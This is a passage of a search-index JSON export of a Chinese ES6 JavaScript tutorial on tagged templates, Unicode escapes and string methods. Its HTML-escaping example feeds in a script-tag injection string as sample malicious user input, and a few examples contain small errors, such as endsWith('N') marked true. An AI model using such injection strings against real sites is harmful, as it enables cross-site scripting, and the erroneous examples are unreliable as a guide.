<p>\u4e5f\u5c31\u662f\u8bf4\uff0c<code>tag</code>\u51fd\u6570\u5b9e\u9645\u4e0a\u4ee5\u4e0b\u9762\u7684\u5f62\u5f0f\u8c03\u7528\u3002</p> <pre><code>tag(['Hello ', ' world ', ''], 15, 50)\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u9700\u8981\u7f16\u5199<code>tag</code>\u51fd\u6570\u7684\u4ee3\u7801\u3002\u4e0b\u9762\u662f<code>tag</code>\u51fd\u6570\u7684\u4e00\u79cd\u5199\u6cd5\uff0c\u4ee5\u53ca\u8fd0\u884c\u7ed3\u679c\u3002</p> <pre><code>let a = 5;\nlet b = 10;\n\nfunction tag(s, v1, v2) {\n  console.log(s[0]);\n  console.log(s[1]);\n  console.log(s[2]);\n  console.log(v1);\n  console.log(v2);\n\n  return \"OK\";\n}\n\ntag`Hello ${ a + b } world ${ a * b}`;\n// \"Hello \"\n// \" world \"\n// \"\"\n// 15\n// 50\n// \"OK\"\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u4f8b\u5b50\u3002</p> <pre><code>let total = 30;\nlet msg = passthru`The total is ${total} (${total*1.05} with tax)`;\n\nfunction passthru(literals) {\n  let result = '';\n  let i = 0;\n\n  while (i &lt; literals.length) {\n    result += literals[i++];\n    if (i &lt; arguments.length) {\n      result += arguments[i];\n    }\n  }\n\n  return result;\n}\n\nmsg // \"The total is 30 (31.5 with tax)\"\n</code></pre> <p>\u4e0a\u9762\u8fd9\u4e2a\u4f8b\u5b50\u5c55\u793a\u4e86\uff0c\u5982\u4f55\u5c06\u5404\u4e2a\u53c2\u6570\u6309\u7167\u539f\u6765\u7684\u4f4d\u7f6e\u62fc\u5408\u56de\u53bb\u3002</p> <p><code>passthru</code>\u51fd\u6570\u91c7\u7528 rest \u53c2\u6570\u7684\u5199\u6cd5\u5982\u4e0b\u3002</p> <pre><code>function passthru(literals, ...values) {\n  let output = \"\";\n  let index;\n  for (index = 0; index &lt; values.length; index++) {\n    output += literals[index] + values[index];\n  }\n\n  output += literals[index]\n  return output;\n}\n</code></pre> <p>\u201c\u6807\u7b7e\u6a21\u677f\u201d\u7684\u4e00\u4e2a\u91cd\u8981\u5e94\u7528\uff0c\u5c31\u662f\u8fc7\u6ee4 HTML \u5b57\u7b26\u4e32\uff0c\u9632\u6b62\u7528\u6237\u8f93\u5165\u6076\u610f\u5185\u5bb9\u3002</p> <pre><code>let message =\n  SaferHTML`&lt;p&gt;${sender} has sent you a message.&lt;/p&gt;`;\n\nfunction SaferHTML(templateData) {\n  let s = templateData[0];\n  for (let i = 1; i &lt; arguments.length; i++) {\n    let arg = String(arguments[i]);\n\n    // Escape special characters in the substitution.\n    s += arg.replace(/&amp;/g, \"&amp;amp;\")\n            .replace(/&lt;/g, \"&amp;lt;\")\n            .replace(/&gt;/g, \"&amp;gt;\");\n\n    // Don't escape special characters in the template.\n    s += templateData[i];\n  }\n  return s;\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>sender</code>\u53d8\u91cf\u5f80\u5f80\u662f\u7528\u6237\u63d0\u4f9b\u7684\uff0c\u7ecf\u8fc7<code>SaferHTML</code>\u51fd\u6570\u5904\u7406\uff0c\u91cc\u9762\u7684\u7279\u6b8a\u5b57\u7b26\u90fd\u4f1a\u88ab\u8f6c\u4e49\u3002</p> <pre><code>let sender = '&lt;script&gt;alert(\"abc\")&lt;/script&gt;'; // \u6076\u610f\u4ee3\u7801\nlet message = SaferHTML`&lt;p&gt;${sender} has sent you a message.&lt;/p&gt;`;\n\nmessage\n// &lt;p&gt;&amp;lt;script&amp;gt;alert(\"abc\")&amp;lt;/script&amp;gt; has sent you a message.&lt;/p&gt;\n</code></pre> <p>\u6807\u7b7e\u6a21\u677f\u7684\u53e6\u4e00\u4e2a\u5e94\u7528\uff0c\u5c31\u662f\u591a\u8bed\u8a00\u8f6c\u6362\uff08\u56fd\u9645\u5316\u5904\u7406\uff09\u3002</p> <pre><code>i18n`Welcome to ${siteName}, you are visitor number ${visitorNumber}!`\n// \"\u6b22\u8fce\u8bbf\u95eexxx\uff0c\u60a8\u662f\u7b2cxxxx\u4f4d\u8bbf\u95ee\u8005\uff01\"\n</code></pre> <p>\u6a21\u677f\u5b57\u7b26\u4e32\u672c\u8eab\u5e76\u4e0d\u80fd\u53d6\u4ee3 Mustache \u4e4b\u7c7b\u7684\u6a21\u677f\u5e93\uff0c\u56e0\u4e3a\u6ca1\u6709\u6761\u4ef6\u5224\u65ad\u548c\u5faa\u73af\u5904\u7406\u529f\u80fd\uff0c\u4f46\u662f\u901a\u8fc7\u6807\u7b7e\u51fd\u6570\uff0c\u4f60\u53ef\u4ee5\u81ea\u5df1\u6dfb\u52a0\u8fd9\u4e9b\u529f\u80fd\u3002</p> <pre><code>// \u4e0b\u9762\u7684hashTemplate\u51fd\u6570\n// \u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u6a21\u677f\u5904\u7406\u51fd\u6570\nlet libraryHtml = hashTemplate`\n  &lt;ul&gt;\n    #for book in ${myBooks}\n      &lt;li&gt;&lt;i&gt;#{book.title}&lt;/i&gt; by #{book.author}&lt;/li&gt;\n    #end\n  &lt;/ul&gt;\n`;\n</code></pre> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u4f60\u751a\u81f3\u53ef\u4ee5\u4f7f\u7528\u6807\u7b7e\u6a21\u677f\uff0c\u5728 JavaScript \u8bed\u8a00\u4e4b\u4e2d\u5d4c\u5165\u5176\u4ed6\u8bed\u8a00\u3002</p> <pre><code>&lt;div&gt;\n  &lt;input\n    ref='input'\n    onChange='${this.handleChange}'\n    defaultValue='${this.state.value}' /&gt;\n  ${this.state.value}\n&lt;/div&gt;\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u901a\u8fc7<code>jsx</code>\u51fd\u6570\uff0c\u5c06\u4e00\u4e2a DOM \u5b57\u7b26\u4e32\u8f6c\u4e3a React \u5bf9\u8c61\u3002\u4f60\u53ef\u4ee5\u5728 GitHub \u627e\u5230<code>jsx</code>\u51fd\u6570\u7684\u5177\u4f53\u5b9e\u73b0\u3002</p> <p>\u4e0b\u9762\u5219\u662f\u4e00\u4e2a\u5047\u60f3\u7684\u4f8b\u5b50\uff0c\u901a\u8fc7<code>java</code>\u51fd\u6570\uff0c\u5728 JavaScript \u4ee3\u7801\u4e4b\u4e2d\u8fd0\u884c Java \u4ee3\u7801\u3002</p> <pre><code>class HelloWorldApp {\n  public static void main(String[] args) {\n    System.out.println(\"Hello World!\"); // Display the string.\n  }\n}\n\nHelloWorldApp.main();\n</code></pre> <p>\u6a21\u677f\u5904\u7406\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff08\u6a21\u677f\u5b57\u7b26\u4e32\u6570\u7ec4\uff09\uff0c\u8fd8\u6709\u4e00\u4e2a<code>raw</code>\u5c5e\u6027\u3002</p> <pre><code>console.log`123`\n// [\"123\", raw: Array[1]]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>console.log</code>\u63a5\u53d7\u7684\u53c2\u6570\uff0c\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u6570\u7ec4\u3002\u8be5\u6570\u7ec4\u6709\u4e00\u4e2a<code>raw</code>\u5c5e\u6027\uff0c\u4fdd\u5b58\u7684\u662f\u8f6c\u4e49\u540e\u7684\u539f\u5b57\u7b26\u4e32\u3002</p> <p>\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002</p> <pre><code>tag`First line\\nSecond line`\n\nfunction tag(strings) {\n  console.log(strings.raw[0]);\n  // strings.raw[0] \u4e3a \"First line\\\\nSecond line\"\n  // \u6253\u5370\u8f93\u51fa \"First line\\nSecond line\"\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>tag</code>\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570<code>strings</code>\uff0c\u6709\u4e00\u4e2a<code>raw</code>\u5c5e\u6027\uff0c\u4e5f\u6307\u5411\u4e00\u4e2a\u6570\u7ec4\u3002\u8be5\u6570\u7ec4\u7684\u6210\u5458\u4e0e<code>strings</code>\u6570\u7ec4\u5b8c\u5168\u4e00\u81f4\u3002\u6bd4\u5982\uff0c<code>strings</code>\u6570\u7ec4\u662f<code>[\"First line\\nSecond line\"]</code>\uff0c\u90a3\u4e48<code>strings.raw</code>\u6570\u7ec4\u5c31\u662f<code>[\"First line\\\\nSecond line\"]</code>\u3002\u4e24\u8005\u552f\u4e00\u7684\u533a\u522b\uff0c\u5c31\u662f\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u659c\u6760\u90fd\u88ab\u8f6c\u4e49\u4e86\u3002\u6bd4\u5982\uff0cstrings.raw \u6570\u7ec4\u4f1a\u5c06<code>\\n</code>\u89c6\u4e3a<code>\\\\</code>\u548c<code>n</code>\u4e24\u4e2a\u5b57\u7b26\uff0c\u800c\u4e0d\u662f\u6362\u884c\u7b26\u3002\u8fd9\u662f\u4e3a\u4e86\u65b9\u4fbf\u53d6\u5f97\u8f6c\u4e49\u4e4b\u524d\u7684\u539f\u59cb\u6a21\u677f\u800c\u8bbe\u8ba1\u7684\u3002</p>"},{"location":"ebook-JSES6-RYF/04-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%89%A9%E5%B1%95/#_5","title":"\u6a21\u677f\u5b57\u7b26\u4e32\u7684\u9650\u5236","text":"<p>\u524d\u9762\u63d0\u5230\u6807\u7b7e\u6a21\u677f\u91cc\u9762\uff0c\u53ef\u4ee5\u5185\u5d4c\u5176\u4ed6\u8bed\u8a00\u3002\u4f46\u662f\uff0c\u6a21\u677f\u5b57\u7b26\u4e32\u9ed8\u8ba4\u4f1a\u5c06\u5b57\u7b26\u4e32\u8f6c\u4e49\uff0c\u5bfc\u81f4\u65e0\u6cd5\u5d4c\u5165\u5176\u4ed6\u8bed\u8a00\u3002</p> <p>\u4e3e\u4f8b\u6765\u8bf4\uff0c\u6807\u7b7e\u6a21\u677f\u91cc\u9762\u53ef\u4ee5\u5d4c\u5165 LaTEX \u8bed\u8a00\u3002</p> <pre><code>function latex(strings) {\n  // ...\n}\n\nlet document = latex`\n\\newcommand{\\fun}{\\textbf{Fun!}}  // \u6b63\u5e38\u5de5\u4f5c\n\\newcommand{\\unicode}{\\textbf{Unicode!}} // \u62a5\u9519\n\\newcommand{\\xerxes}{\\textbf{King!}} // \u62a5\u9519\n\nBreve over the h goes \\u{h}ere // \u62a5\u9519\n`\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>document</code>\u5185\u5d4c\u7684\u6a21\u677f\u5b57\u7b26\u4e32\uff0c\u5bf9\u4e8e LaTEX \u8bed\u8a00\u6765\u8bf4\u5b8c\u5168\u662f\u5408\u6cd5\u7684\uff0c\u4f46\u662f JavaScript \u5f15\u64ce\u4f1a\u62a5\u9519\u3002\u539f\u56e0\u5c31\u5728\u4e8e\u5b57\u7b26\u4e32\u7684\u8f6c\u4e49\u3002</p> <p>\u6a21\u677f\u5b57\u7b26\u4e32\u4f1a\u5c06<code>\\u00FF</code>\u548c<code>\\u{42}</code>\u5f53\u4f5c Unicode \u5b57\u7b26\u8fdb\u884c\u8f6c\u4e49\uff0c\u6240\u4ee5<code>\\unicode</code>\u89e3\u6790\u65f6\u62a5\u9519\uff1b\u800c<code>\\x56</code>\u4f1a\u88ab\u5f53\u4f5c\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u4e49\uff0c\u6240\u4ee5<code>\\xerxes</code>\u4f1a\u62a5\u9519\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c<code>\\u</code>\u548c<code>\\x</code>\u5728 LaTEX \u91cc\u9762\u6709\u7279\u6b8a\u542b\u4e49\uff0c\u4f46\u662f JavaScript \u5c06\u5b83\u4eec\u8f6c\u4e49\u4e86\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cES2018 \u653e\u677e\u4e86\u5bf9\u6807\u7b7e\u6a21\u677f\u91cc\u9762\u7684\u5b57\u7b26\u4e32\u8f6c\u4e49\u7684\u9650\u5236\u3002\u5982\u679c\u9047\u5230\u4e0d\u5408\u6cd5\u7684\u5b57\u7b26\u4e32\u8f6c\u4e49\uff0c\u5c31\u8fd4\u56de<code>undefined</code>\uff0c\u800c\u4e0d\u662f\u62a5\u9519\uff0c\u5e76\u4e14\u4ece<code>raw</code>\u5c5e\u6027\u4e0a\u9762\u53ef\u4ee5\u5f97\u5230\u539f\u59cb\u5b57\u7b26\u4e32\u3002</p> <pre><code>function tag(strs) {\n  strs[0] === undefined\n  strs.raw[0] === \"\\\\unicode and \\\\u{55}\";\n}\ntag`\\unicode and \\u{55}`\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6a21\u677f\u5b57\u7b26\u4e32\u539f\u672c\u662f\u5e94\u8be5\u62a5\u9519\u7684\uff0c\u4f46\u662f\u7531\u4e8e\u653e\u677e\u4e86\u5bf9\u5b57\u7b26\u4e32\u8f6c\u4e49\u7684\u9650\u5236\uff0c\u6240\u4ee5\u4e0d\u62a5\u9519\u4e86\uff0cJavaScript \u5f15\u64ce\u5c06\u7b2c\u4e00\u4e2a\u5b57\u7b26\u8bbe\u7f6e\u4e3a<code>undefined</code>\uff0c\u4f46\u662f<code>raw</code>\u5c5e\u6027\u4f9d\u7136\u53ef\u4ee5\u5f97\u5230\u539f\u59cb\u5b57\u7b26\u4e32\uff0c\u56e0\u6b64<code>tag</code>\u51fd\u6570\u8fd8\u662f\u53ef\u4ee5\u5bf9\u539f\u5b57\u7b26\u4e32\u8fdb\u884c\u5904\u7406\u3002</p> <p>\u6ce8\u610f\uff0c\u8fd9\u79cd\u5bf9\u5b57\u7b26\u4e32\u8f6c\u4e49\u7684\u653e\u677e\uff0c\u53ea\u5728\u6807\u7b7e\u6a21\u677f\u89e3\u6790\u5b57\u7b26\u4e32\u65f6\u751f\u6548\uff0c\u4e0d\u662f\u6807\u7b7e\u6a21\u677f\u7684\u573a\u5408\uff0c\u4f9d\u7136\u4f1a\u62a5\u9519\u3002</p> <pre><code>let bad = `bad escape sequence: \\unicode`; // \u62a5\u9519\n</code></pre>"},{"location":"ebook-JSES6-RYF/04-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%89%A9%E5%B1%95/#unicode","title":"Unicode \u8868\u793a\u6cd5","text":"<p>\u4f7f\u7528\u4e0d\u591a\uff1aES6 \u52a0\u5f3a\u4e86\u5bf9 Unicode \u7684\u652f\u6301\uff0c\u5141\u8bb8\u91c7\u7528<code>\\uxxxx</code>\u5f62\u5f0f\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u5176\u4e2d<code>xxxx</code>\u8868\u793a\u5b57\u7b26\u7684 Unicode \u7801\u70b9\u3002</p> <pre><code>\"\\u0061\"\n// \"a\"\n\n// \u5bf9\u4e8e\u540e\u9762\u7684\u7b26\u53f7\u8d85\u8fc7unicode\u7f16\u7801\uff0c\u9700\u8981\u5c06\u7b26\u53f7\u4f7f\u7528\u5927\u62ec\u53f7\u62ec\u8d77\u6765\n\"\\u{20BB7}\"\n// \"\ud842\udfb7\"\n\n\"\\u{41}\\u{42}\\u{43}\"\n// \"ABC\"\n\nlet hello = 123;\nhell\\u{6F} // 123\n</code></pre> <p>ES6 JavaScript \u5171\u6709 6 \u79cd\u65b9\u6cd5\u53ef\u4ee5\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u3002</p> <pre><code>'\\z' === 'z'  // true\n'\\172' === 'z' // true\n'\\x7A' === 'z' // true\n'\\u007A' === 'z' // true\n'\\u{7A}' === 'z' // true\n</code></pre>"},{"location":"ebook-JSES6-RYF/04-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%89%A9%E5%B1%95/#_6","title":"\u904d\u5386\u5668\u63a5\u53e3","text":"<p>ES6 \u4e3a\u5b57\u7b26\u4e32\u6dfb\u52a0\u4e86\u904d\u5386\u5668\u63a5\u53e3\uff0c\u4f7f\u5f97\u5b57\u7b26\u4e32\u53ef\u4ee5\u88ab<code>for...of</code>\u5faa\u73af\u904d\u5386\u3002</p> <pre><code>for (let codePoint of 'foo') {\n  console.log(codePoint)\n}\n// \"f\"\n// \"o\"\n// \"o\"\n</code></pre> <p>\u9664\u4e86\u904d\u5386\u5b57\u7b26\u4e32\uff0c\u8fd9\u4e2a\u904d\u5386\u5668\u6700\u5927\u7684\u4f18\u70b9\u662f\u53ef\u4ee5\u8bc6\u522b\u5927\u4e8e<code>0xFFFF</code>\u7684\u7801\u70b9\uff0c\u4f20\u7edf\u7684<code>for</code>\u5faa\u73af\u65e0\u6cd5\u8bc6\u522b\u8fd9\u6837\u7684\u7801\u70b9\u3002</p> <pre><code>let text = String.fromCodePoint(0x20BB7);\nfor (let i of text) {\n  console.log(i);\n}\n// \"\ud842\udfb7\"\n</code></pre>"},{"location":"ebook-JSES6-RYF/04-%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%89%A9%E5%B1%95/#u2028-u2029","title":"\u76f4\u63a5\u8f93\u5165 U+2028 \u548c U+2029","text":"<p>JavaScript \u5b57\u7b26\u4e32\u5141\u8bb8\u76f4\u63a5\u8f93\u5165\u5b57\u7b26\uff0c\u4ee5\u53ca\u8f93\u5165\u5b57\u7b26\u7684\u8f6c\u4e49\u5f62\u5f0f\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u201c\u4e2d\u201d\u7684 Unicode \u7801\u70b9\u662f U+4e2d\uff0c\u4f60\u53ef\u4ee5\u76f4\u63a5\u5728\u5b57\u7b26\u4e32\u91cc\u9762\u8f93\u5165\u8fd9\u4e2a\u6c49\u5b57\uff0c\u4e5f\u53ef\u4ee5\u8f93\u5165\u5b83\u7684\u8f6c\u4e49\u5f62\u5f0f<code>\\u4e2d</code>\uff0c\u4e24\u8005\u662f\u7b49\u4ef7\u7684\u3002</p> <pre><code>'\u4e2d' === '\\u4e2d' // true\n</code></pre> <p>\u4f46\u662f\uff0cJavaScript \u89c4\u5b9a\u67095\u4e2a\u5b57\u7b26\uff0c\u4e0d\u80fd\u5728\u5b57\u7b26\u4e32\u91cc\u9762\u76f4\u63a5\u4f7f\u7528\uff0c\u53ea\u80fd\u4f7f\u7528\u8f6c\u4e49\u5f62\u5f0f\u3002</p> <ul> <li>U+005C\uff1a\u53cd\u659c\u6760\uff08reverse solidus)</li> <li>U+000D\uff1a\u56de\u8f66\uff08carriage return\uff09</li> <li>U+2028\uff1a\u884c\u5206\u9694\u7b26\uff08line separator\uff09</li> <li>U+2029\uff1a\u6bb5\u5206\u9694\u7b26\uff08paragraph separator\uff09</li> <li>U+000A\uff1a\u6362\u884c\u7b26\uff08line feed\uff09</li> </ul> <p>\u4e3e\u4f8b\u6765\u8bf4\uff0c\u5b57\u7b26\u4e32\u91cc\u9762\u4e0d\u80fd\u76f4\u63a5\u5305\u542b\u53cd\u659c\u6760\uff0c\u4e00\u5b9a\u8981\u8f6c\u4e49\u5199\u6210<code>\\\\</code>\u6216\u8005<code>\\u005c</code>\u3002</p> <p>\u8fd9\u4e2a\u89c4\u5b9a\u672c\u8eab\u6ca1\u6709\u95ee\u9898\uff0c\u9ebb\u70e6\u5728\u4e8e JSON \u683c\u5f0f\u5141\u8bb8\u5b57\u7b26\u4e32\u91cc\u9762\u76f4\u63a5\u4f7f\u7528 U+2028\uff08\u884c\u5206\u9694\u7b26\uff09\u548c U+2029\uff08\u6bb5\u5206\u9694\u7b26\uff09\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u670d\u52a1\u5668\u8f93\u51fa\u7684 JSON \u88ab<code>JSON.parse</code>\u89e3\u6790\uff0c\u5c31\u6709\u53ef\u80fd\u76f4\u63a5\u62a5\u9519\u3002</p> <pre><code>const json = '\"\\u2028\"';\nJSON.parse(json); // \u53ef\u80fd\u62a5\u9519\n</code></pre> <p>JSON \u683c\u5f0f\u5df2\u7ecf\u51bb\u7ed3\uff08RFC 7159\uff09\uff0c\u6ca1\u6cd5\u4fee\u6539\u4e86\u3002\u4e3a\u4e86\u6d88\u9664\u8fd9\u4e2a\u62a5\u9519\uff0cES2019 \u5141\u8bb8 JavaScript \u5b57\u7b26\u4e32\u76f4\u63a5\u8f93\u5165 U+2028\uff08\u884c\u5206\u9694\u7b26\uff09\u548c U+2029\uff08\u6bb5\u5206\u9694\u7b26\uff09\u3002\u6839\u636e\u8fd9\u4e2a\u63d0\u6848\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u62a5\u9519\u3002</p> <pre><code>const PS = eval(\"'\\u2029'\");\n</code></pre> <p>\u6ce8\u610f\uff0c\u6a21\u677f\u5b57\u7b26\u4e32\u73b0\u5728\u5c31\u5141\u8bb8\u76f4\u63a5\u8f93\u5165\u8fd9\u4e24\u4e2a\u5b57\u7b26\u3002\u53e6\u5916\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u4f9d\u7136\u4e0d\u5141\u8bb8\u76f4\u63a5\u8f93\u5165\u8fd9\u4e24\u4e2a\u5b57\u7b26\uff0c\u8fd9\u662f\u6ca1\u6709\u95ee\u9898\u7684\uff0c\u56e0\u4e3a JSON \u672c\u6765\u5c31\u4e0d\u5141\u8bb8\u76f4\u63a5\u5305\u542b\u6b63\u5219\u8868\u8fbe\u5f0f\u3002</p> <p>\u6839\u636e\u6807\u51c6\uff0cJSON \u6570\u636e\u5fc5\u987b\u662f UTF-8 \u7f16\u7801\u3002\u4f46\u662f\uff0c\u73b0\u5728\u7684<code>JSON.stringify()</code>\u65b9\u6cd5\u6709\u53ef\u80fd\u8fd4\u56de\u4e0d\u7b26\u5408 UTF-8 \u6807\u51c6\u7684\u5b57\u7b26\u4e32\u3002</p> <p>\u5177\u4f53\u6765\u8bf4\uff0cUTF-8 \u6807\u51c6\u89c4\u5b9a\uff0c<code>0xD800</code>\u5230<code>0xDFFF</code>\u4e4b\u95f4\u7684\u7801\u70b9\uff0c\u4e0d\u80fd\u5355\u72ec\u4f7f\u7528\uff0c\u5fc5\u987b\u914d\u5bf9\u4f7f\u7528\u3002\u6bd4\u5982\uff0c<code>\\uD834\\uDF06</code>\u662f\u4e24\u4e2a\u7801\u70b9\uff0c\u4f46\u662f\u5fc5\u987b\u653e\u5728\u4e00\u8d77\u914d\u5bf9\u4f7f\u7528\uff0c\u4ee3\u8868\u5b57\u7b26<code>\ud834\udf06</code>\u3002\u8fd9\u662f\u4e3a\u4e86\u8868\u793a\u7801\u70b9\u5927\u4e8e<code>0xFFFF</code>\u7684\u5b57\u7b26\u7684\u4e00\u79cd\u53d8\u901a\u65b9\u6cd5\u3002\u5355\u72ec\u4f7f\u7528<code>\\uD834</code>\u548c<code>\\uDFO6</code>\u8fd9\u4e24\u4e2a\u7801\u70b9\u662f\u4e0d\u5408\u6cd5\u7684\uff0c\u6216\u8005\u98a0\u5012\u987a\u5e8f\u4e5f\u4e0d\u884c\uff0c\u56e0\u4e3a<code>\\uDF06\\uD834</code>\u5e76\u6ca1\u6709\u5bf9\u5e94\u7684\u5b57\u7b26\u3002</p> <p><code>JSON.stringify()</code>\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5b83\u53ef\u80fd\u8fd4\u56de<code>0xD800</code>\u5230<code>0xDFFF</code>\u4e4b\u95f4\u7684\u5355\u4e2a\u7801\u70b9\u3002</p> <pre><code>JSON.stringify('\\u{D834}') // \"\\u{D834}\"\n</code></pre> <p>\u4e3a\u4e86\u786e\u4fdd\u8fd4\u56de\u7684\u662f\u5408\u6cd5\u7684 UTF-8 \u5b57\u7b26\uff0cES2019 \u6539\u53d8\u4e86<code>JSON.stringify()</code>\u7684\u884c\u4e3a\u3002\u5982\u679c\u9047\u5230<code>0xD800</code>\u5230<code>0xDFFF</code>\u4e4b\u95f4\u7684\u5355\u4e2a\u7801\u70b9\uff0c\u6216\u8005\u4e0d\u5b58\u5728\u7684\u914d\u5bf9\u5f62\u5f0f\uff0c\u5b83\u4f1a\u8fd4\u56de\u8f6c\u4e49\u5b57\u7b26\u4e32\uff0c\u7559\u7ed9\u5e94\u7528\u81ea\u5df1\u51b3\u5b9a\u4e0b\u4e00\u6b65\u7684\u5904\u7406\u3002</p> <pre><code>JSON.stringify('\\u{D834}') // \"\"\\\\uD834\"\"\nJSON.stringify('\\uDF06\\uD834') // \"\"\\\\udf06\\\\ud834\"\"\n</code></pre>"},{"location":"ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/","title":"\u5b57\u7b26\u4e32\u65b0\u65b9\u6cd5","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 10783  \u9605\u8bfb22\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/#includes-startswith-endswith","title":"includes(), startsWith(), endsWith()","text":"<p>\u4f20\u7edf\u4e0a\uff0cJavaScript \u53ea\u6709<code>indexOf</code>\u65b9\u6cd5\uff0c\u53ef\u4ee5\u7528\u6765\u786e\u5b9a\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f\u5426\u5305\u542b\u5728\u53e6\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u3002ES6 \u53c8\u63d0\u4f9b\u4e86\u4e09\u79cd\u65b0\u65b9\u6cd5\u3002</p> <ul> <li>includes()\uff1a\u8fd4\u56de\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u627e\u5230\u4e86\u53c2\u6570\u5b57\u7b26\u4e32\u3002</li> <li>startsWith()\uff1a\u8fd4\u56de\u5e03\u5c14\u503c\uff0c\u8868\u793a\u53c2\u6570\u5b57\u7b26\u4e32\u662f\u5426\u5728\u539f\u5b57\u7b26\u4e32\u7684\u5934\u90e8\u3002</li> <li>endsWith()\uff1a\u8fd4\u56de\u5e03\u5c14\u503c\uff0c\u8868\u793a\u53c2\u6570\u5b57\u7b26\u4e32\u662f\u5426\u5728\u539f\u5b57\u7b26\u4e32\u7684\u5c3e\u90e8\u3002</li> </ul> <pre><code>let s = 'Michael An';\ns.startsWith('An') // false\ns.endsWith('N') // true\ns.includes('An') // true\n</code></pre> <p>\u8fd9\u4e09\u4e2a\u65b9\u6cd5\u90fd\u652f\u6301\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u5f00\u59cb\u641c\u7d22\u7684\u4f4d\u7f6e\u3002\u4f7f\u7528\u7b2c\u4e8c\u4e2a\u53c2\u6570<code>n</code>\u65f6\uff0c<code>endsWith</code>\u7684\u884c\u4e3a\u4e0e\u5176\u4ed6\u4e24\u4e2a\u65b9\u6cd5\u6709\u6240\u4e0d\u540c\u3002\u5b83\u9488\u5bf9\u524d<code>n</code>\u4e2a\u5b57\u7b26\uff0c\u800c\u5176\u4ed6\u4e24\u4e2a\u65b9\u6cd5\u9488\u5bf9\u4ece\u7b2c<code>n</code>\u4e2a\u4f4d\u7f6e\u76f4\u5230\u5b57\u7b26\u4e32\u7ed3\u675f\u3002</p> <pre><code>let s = 'Hello world!';\ns.startsWith('world', 6) // true\ns.endsWith('Hello', 5) // true\ns.includes('Hello', 6) // false\n</code></pre>"},{"location":"ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/#_2","title":"\u5b57\u7b26\u4e32\u590d\u5236\u622a\u53d6","text":""},{"location":"ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/#repeat","title":"repeat()","text":"<p><code>repeat</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u65b0\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5c06\u539f\u5b57\u7b26\u4e32\u91cd\u590d<code>n</code>\u6b21\u3002\u53c2\u6570\u9ed8\u8ba4\u662f\u81ea\u7136\u6570\uff0c\u5982\u679c\u662f\u5c0f\u6570\uff0c\u4f1a\u88ab\u53d6\u6574\u3002</p> <pre><code>'x'.repeat(3) // \"xxx\"\n'hello'.repeat(2) // \"hellohello\"\n'na'.repeat(0) // \"\"\n'na'.repeat(2.9) // \"nana\"\n</code></pre> <p>\u53c2\u6570<code>NaN</code>\u7b49\u540c\u4e8e 0\u3002</p> <pre><code>'na'.repeat(NaN) // \"\"\n</code></pre> <p>\u5982\u679c<code>repeat</code>\u7684\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u5219\u4f1a\u5148\u8f6c\u6362\u6210\u6570\u5b57\u3002</p> <pre><code>'na'.repeat('na') // \"\"\n'na'.repeat('3') // \"nanana\"\n</code></pre>"},{"location":"ebook-JSES6-RYF/05-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/#padstartpadend","title":"padStart()\uff0cpadEnd()","text":"<p>ES2017 \u5f15\u5165\u4e86\u5b57\u7b26\u4e32\u8865\u5168\u957f\u5ea6\u7684\u529f\u80fd\u3002\u5982\u679c\u67d0\u4e2a\u5b57\u7b26\u4e32\u4e0d\u591f\u6307\u5b9a\u957f\u5ea6\uff0c\u4f1a\u5728\u5934\u90e8\u6216\u5c3e\u90e8\u8865\u5168\u3002<code>padStart()</code>\u7528\u4e8e\u5934\u90e8\u8865\u5168\uff0c<code>padEnd()</code>\u7528\u4e8e\u5c3e\u90e8\u8865\u5168\u3002padStart() 